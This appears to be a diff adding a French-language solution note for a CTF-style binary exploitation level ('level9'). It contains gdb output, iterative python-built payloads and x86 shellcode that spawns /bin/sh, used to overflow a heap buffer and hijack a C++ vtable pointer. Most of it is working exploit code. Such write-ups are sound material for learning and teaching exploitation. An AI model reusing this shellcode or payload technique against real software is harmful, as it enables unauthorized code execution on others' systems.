@@ -1,0 +1,85 @@
+./level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAA
+
+\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80 //len = 43 or more
+
+0x804a000:      0x00000000      0x00000071      0x08048848      0x41414141
+0x804a010:      0x41414141      0x41414141      0x41414141      0x41414141
+
+buffer -> 0x0804a00c
+
+
+0x0804a00c -> debut de notre buffer
+
+Goal : Faire pointer eip vers 0x0804a00c en jouant avec l'overwrite
+
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -> 0x54000000 in ?? ()
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaA -> 0x54000000 in ?? ()
+Seule le dernier charactère influence l adresse de sortie.
+
+//
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08049b88 in vtable for __cxxabiv1::__class_type_info ()
+
+//
+
+Starting program: /home/user/level9/level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048850 in typeinfo name for N ()
+
+//
+
+b *0x08048693 (   0x08048693 <+159>:   call   *%edx     )
+
+L -> edx = 0x0804874e
+H -> edx = 0x0804873a
+T -> edx = 0x08049b88
+
+//
+
+\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80 -> len = 58
+
+0x0804a00c
+\x0c\xa0\x04\x08
+
+$(python -c "print 'A'*108 + '\x0c\xa0\x04\x08'")
+
+\x10\xa0\x04\x08
+
+\x10\xa0\x04\x08\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0c\xa0\x04\x08
+
+$(python -c "print '\x10\xa0\x04\x08' + 'A'*43 + 'A'*61 + '\x0c\xa0\x04\x08'")
+
+$(python -c "print 'A'*4 + 'A'*43 + 'A'*61 + '\x0c\xa0\x04\x08'")
+
+
+$(python -c "print 'A'*4 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A'*46 + '\x0c\xa0\x04\x08'")
+
+$(python -c "print 'ABCD' + 'A'*58 + 'A'*46 + '\x0c\xa0\x04\x08'")
+
+$(python -c "print 'A'*4 + 'A'*20 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A'*26 + '\x0c\xa0\x04\x08'")
+
+'\x90'*30
+
+$(python -c "print 'A'*4 + '\x90'*49 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08'")
+
+$(python -c "print '\x10\xa0\x04\x08' + '\x90'*49 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08'")
+
+$(python -c "print '\x10\xa0\x04\x08' + '\x90'*49 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08'" ; cat)
+
+
+./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x90'*49 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08'")
+
+Explication :
+buffer : "[buffer_addr + 1][next*49][code to exec /bin/sh][buffer_addr]
+
+Qu'est-ce qu'il se passe? On overflow notre buffer à exactement +108 => notre malloc fait 108 du coup on commence au début du prochain malloc soit le malloc d'après
+le malloc d'après est l'addresse du notre structure, soit notre vtable
+donc vtable = buffer
+ensuite on veux acceder à notre premiere fonction de la vtable, soit la cmd : "**vtable;"
+donc le début de notre buffer va être l'addresse vers la suite de notre buffer car on a un déreferencement en plus
+puis on met notre shell code en le remplissant pour faire exactement 108 caractères 
